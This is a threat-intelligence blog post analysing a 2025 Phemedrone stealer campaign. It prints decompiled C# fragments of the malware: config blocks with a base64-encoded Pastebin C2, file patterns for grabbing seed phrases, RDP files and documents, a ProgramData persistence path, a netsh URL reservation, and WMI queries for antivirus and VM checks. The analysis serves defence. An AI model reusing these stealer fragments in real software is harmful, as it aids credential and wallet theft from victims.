---
layout: post
title:  Return of the Phemedrone Stealer - Part Two
date: 2025-07-13
categories: [Malware, Loader, DotNet]
tag: [Malware, Loader, DotNet]
---

<img src="assets/images/blogs/Phenedrome/Phen-Banner-part2.png" alt="Phen Banner" width="800" height="500">


## Overview

In the last blog, I covered a campaign that was being conducted by a cybercriminal using the Phenedrome stealer, which hasn't been seen in a while. In the last blog, I covered the fake AnyDesk website stood up by the threat actor, and how that was used to socially engineer a victim into downloaded a loader for Phenedrome. If you want to read that blog first, feel free to go to the [link here](https://echo01409.github.io/posts/phenedrome-part-1/).

In this blog, I'm gonig to cover the stealer itself, specifically what has changed in this campaign versus other campaigns that have gone before. Though this campaigns stealer implementation is much simpler, it will still give you a glimpse into how the stealer is intended to work, if used properly.

## The Phemedrone Stealer

This version of the Phemedrone stealer does not really distinguish itself against other stealers in terms of scope and scale. Its capability includes collecting a variety of information from the victim's machine, including passwords, cryptocurrency wallet ID’s, financial information, and browser credentials. The malware is also reasonably modular, and from the panel can be customized to allow for various different builds – not unlike many other commodity stealers.

Though, unlike some stealers, there appears to be no persistence mechanisms embedded inside the binary; Phemedrone appears to be designed to access the machine, steal data, exfiltrate the data to a telegram bot as a ZIP archive, then terminating its execution. There was also very little in the way of anti-analysis in this particular version, which struck us as odd since this version of the stealer is the newest to date – this suggests that the sample we have access to from this campaign was built with no special configurations.

### August 2024 Campaign

Shown below is configuration data from a sample captured in [August 2024](https://www.splunk.com/en_us/blog/security/unveiling-phemedrone-stealer-threat-analysis-and-detections.html). As shown uses a telegram bot as the C2, and has a setting for `AntiCIS`, which suggests the malware was designed with some considerations around preventing it from executing on systems in CIS regions (Russia, Armenia, Belarus, Kazakhstan, among others). The stealer also has a configurable setting for `AntiDebug` and `AntiVM`.

<img src="assets/images/blogs/Phenedrome/old-config.png" alt="old 2024 configuration for Phemedrone" width="700" height="500">

### June 2025 Campaign Malware Config

The sample from this (June 2025) campaign was much simpler in design and lacked many of these features, suggesting the individual configuring the sample did not have the knowledge, capability, motivation, or operational requirement to ensure this sample deployed with the most protection possible.

The picture below shows the configuration from the actual sample deployed as part of this campaign, including the C2, encoded in base64 as the value of `helpff`, which decodes to `hxxps://pastebin[.]com/raw/YwvHhwUk`. Pastebin is a website used to share plaintext data and configuration files, and is often used by cybercriminals, alongside telegram, to share stolen data with other criminals.

<img src="assets/images/blogs/Phenedrome/helpff.png" alt="June 2025 configuration for Phemedrone" width="700" height="500">

It then sets options such as enabling or disabling proxies, rerun behavior, and stub strings. The list of `proxyServers` includes entries like `"f.f.f.fd"` and `"xproxy10%"`, which may serve as placeholders or obfuscation for routing traffic:

```cs
Config.proxyServers = new List<string>
{
    "f.f.f.fd",
    "f.f.f.f",
    "f.f.f.ff",
    "f.f.f.f.",
    "f.f.f.fb",
    "f.f.f.fv",
    "f.f.f.fc",
    "xproxy8%",
    "xproxy9%",
    "xproxy10%"
};
```
The stealer is configured to search for files using the following patterns, primarily targeting sensitive data like credentials, seed phrases, and document files:

```cs
Config.Raddaelofusss = new List<string>
{
    "*.txt",
    "*seed*",
    "*.dat",
    "*.rdp",
    "*.sql",
    "*.doc*",
    "*.docx"
};
```
It sets limits on how deep into the file system to search (`GrabberDepth = 2`) and the maximum file size to grab (`GrabberFileSize = 10`, likely in `MB`). The following paths and names are used to establish persistence in a directory under `CommonApplicationData`, likely something like `C:\ProgramData\ulovjn\vjrevej.exe`:

```cs
Config.dir = "ulovjn";
Config.bin = "vjrevej";
Config.wofccccch = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), Config.dir));
Config.Wondefullile = new FileInfo(Path.Combine(Config.wofccccch.FullName, Config.bin + ".exe"));
```
Lastly, the malware identifies its own process path using:

```cs
Config.Savanna = Process.GetCurrentProcess().MainModule.FileName;
```
This allows it to perform operations like copying, persistence installation, or self-deletion. In sum, this configuration block provides a clear view into the stealer’s functionality—C2 communication, file harvesting, and persistence.


## Functionality

In terms of the stealers actual operations, the first thing it does is make use of the Windows `netsh` utility to reverse a `HTTP` URL for listening on the system, so that the malware has that URL available to bind to later on:

```cs
public class Program
{
    private static void ReserveUrl(string url)
    {
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "netsh",
            Arguments = "http add urlacl url=" + url + " user=Everyone",
            Verb = "runas",
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = true
        };
        try
        {
            Process.Start(startInfo).WaitForExit();
        }
        catch (Exception ex)
        {
            // Reservation error message in Russian
            Console.WriteLine("Ошибка резервирования URL: " + ex.Message);
        }
    }
}
```

It’ll build a command like:

```bash
netsh http add urlacl url=http://malware-url user=Everyone
```

The malware also gathers information about the system, with specific values being Base64 encoded:

```cs
  private static IEnumerable<string> GetAv()
        {
            List<string> list = new List<string>();
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Config.CroshkaENOT("cm9vdFxcU2VjdXJpdHlDZW50ZXIy"), Config.CroshkaENOT("U0VMRUNUICogRlJPTSBBbnRpdmlydXNQcm9kdWN0"));
                ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                {
                    string item = managementBaseObject["displayName"].ToString();
                    list.Add(item);
                }
            }
            catch
            {
        }
    return list;
}
```

There is also a reference in the stealer to the list of CIS (Commonwealth of Independent States) countries mentioned earlier in the blog, though the strings in this list aren’t used anywhere. A working theory is that the user did not configure `AntiCIS` for this particular sample, as we could find no further reference in the binary as to where this list is used.

```cs
        public static bool emojiu()
        {
            List<string> list = new List<string>
            {
                "Armenia",
                "Azerbaijan",
                "Belarus",
                "Kazakhstan",
                "Kyrgyzstan",
                "Moldova",
                "Tajikistan",
                "Uzbekistan",
                "Russia"
            };
            list.Sort();
            foreach (string value in list)
            {
                bool flag = Config.Bauntidddddddddddd.Contains(value);
                if (flag)
                {
                    return true;
                }
            }
            return false;
        }
```

When the stealer is built and configured without obfuscation, it’s pretty straightforward to identify the various functions and methods for gathering data from the victim machine, including system information and the presence of antivirus products.

<img src="assets/images/blogs/Phenedrome/functions.png" alt="functions" width="500" height="500">

## Enumeration and Antivirus Detection

The function below gets the name of the CPU used by the victim machine. The base64 string decodes to `SELECT * FROM Win32_Processor`.

<img src="assets/images/blogs/Phenedrome/enum1.png" alt="enumeration" width="700" height="500">

It also appears to be doing a virtual machine check via `SELECT * FROM Win32_VideoController`. After doing the virtual machine check, the binary also checks for running antivirus products via `SELECT * FROM AntivirusProduct`:

<img src="assets/images/blogs/Phenedrome/enum2.png" alt="enumeration" width="700" height="500">

In total, it performs information collection activities across the following areas:

| System Information                        | Technique  |
|----------                                 |----------|
| Get AV Product Installed                  | `"root\\SecurityCenter2","SELECT * FROM AntivirusProduct"`                            |
| Get CPU Information                       | `"SELECT * FROM Win32_Processor"`                                                     |
| Get Geolocation Information               | `hxxp[://]ip-api[.]com/json/?fields=11827`                                            |
| Get GPU                                   | `"SELECT * FROM Win32_VideoController"`                                               |
| Get Hardware Information                  | `"SELECT * FROM Win32_Processor"` `"SELECT * FROM Win32_DiskDrive"`                   |
| Get RAM                                   | `"SELECT * FROM Win32_ComputerSystem"`                                                |
| Windows ProductName                       | `"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion”, “ProductName”`|

The below `Collect` function takes all of the information gathered by the malware, and stores it in JSON format:

<img src="assets/images/blogs/Phenedrome/collect.png" alt="collection" width="700" height="500">

All of the collected data is then stored in a text file, `XInformation.txt`.

<img src="assets/images/blogs/Phenedrome/information.png" alt="Stolen information stored in XInformation.txt" width="700" height="500">


## Conclusion

This has been a pretty detailed look at how Phenedrome stealer is currently being used to low capability cyber criminals. This blog has highlighted how the campaign as a whole wasn’t very sophisticated, but does it really need to be? The loader was downloaded from a pretty convincing AnyDesk clone website, which many victims would feasibly fall for, and with social engineering and phishing being the most successful initial access vectors, there is no real need to overcomplicate malware devliery if the basics work.

If the victim doesn’t have an antivirus solution other than defender (which the loader sets a file path exclusion for), there is nothing to stop this simply configured malware from going in, stealing data, and exfiltrating it to a pastebin, where it can be publicly shared, sold, or used by the threat actor in any way they see fit.

Does a stealer like this have the capability to target an enterprise? No. Malware like this is designed to target individual victims and small businesses where a cybercriminal can exploit low-hanging fruit. Even though this malware was fairly simple in its design and deployment, there is value in sharing any new campaign to show how cybercriminals are operating commodity malware.

On this occasion, I won't really be providing detections, considering the malware is pretty similar to previous iterations, and the existing detections are sufficient for detecting Phemedrone. Splunk released a good advisory and details on how to detect Phemedrone, [linked here](https://research.splunk.com/stories/phemedrone_stealer/).

























